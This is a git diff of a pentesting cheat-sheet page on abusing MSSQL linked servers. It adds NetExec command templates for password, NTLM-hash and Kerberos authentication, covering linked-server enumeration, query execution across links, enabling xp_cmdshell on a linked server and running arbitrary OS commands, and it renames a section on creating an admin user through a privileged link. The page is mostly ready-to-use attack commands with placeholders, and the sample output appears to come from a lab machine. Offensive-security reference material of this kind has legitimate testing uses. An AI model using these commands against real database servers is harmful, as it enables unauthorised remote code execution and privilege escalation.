@@ -3,7 +3,9 @@ title: "MSSQL Linked Servers"
 tags: ["Database Dumping", "Privilege Escalation In Databases", "MSSQL", "Database", "Windows", "Linked Server"]
 ---
 
-### Enum
+{{< filter_buttons >}}
+
+### Enumeration
 
 {{< tab set1 tab1 >}}SQL{{< /tab >}}
 {{< tab set1 tab2 >}}nxc{{< /tab >}}
@@ -31,7 +33,33 @@ enum_links;
 
 #### 1. Enumerate Linked MSSQL Servers
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M enum_links
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M enum_links
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M enum_links
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M enum_links
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
 ```
 
@@ -66,7 +94,33 @@ EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M exec_on_link -o LINKED_SERVER=<LINKED_SERVER> COMMAND=<QUERY>
 ```
 
@@ -82,14 +136,40 @@ EXEC_ON_... 10.129.254.242  1433   DC               [*] Command output: []
 
 ---
 
-### Abuse #1: Execute Shell Commands on the Linked Server
+### Execute Shell Commands on the Linked Server
 
 {{< tab set3 tab1 >}}nxc{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
 #### 1. Enable the CMD Shell on a Linked Server
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M link_enable_xp -o LINKED_SERVER=<LINKED_SERVER> ACTION=enable
 ```
 
@@ -106,7 +186,33 @@ LINK_ENA... 10.129.254.242  1433   DC               [+] xp_cmdshell enabled on W
 
 #### 2. RCE
 
+```console {class="password"}
+# Password
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
+```
+
+```console {class="ntlm"}
+# NTLM
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
+```
+
+```console {class="password-based-kerberos"}
+# Password-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
+```
+
+```console {class="ntlm-based-kerberos"}
+# NTLM-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -H '<HASH>' -d <DOMAIN> -k --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
+```
+
+```console {class="ticket-based-kerberos"}
+# Ticket-based Kerberos
+nxc mssql <TARGET> -u '<USER>' -d <DOMAIN> -k --use-kcache --kdcHost <DC> -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
+```
+
 ```console
+# Local Auth
 nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M link_xpcmd -o LINKED_SERVER=<LINKED_SERVER> CMD='<CMD>'
 ```
 
@@ -124,7 +230,7 @@ LINK_XPCMD  10.129.254.242  1433   DC               [+] Command output:
 
 ---
 
-### Abuse #2: Create Admin User from Privilege Linked Server
+### Create Admin User from Privilege Linked Server
 
 {{< tab set4 tab1 >}}SQL{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
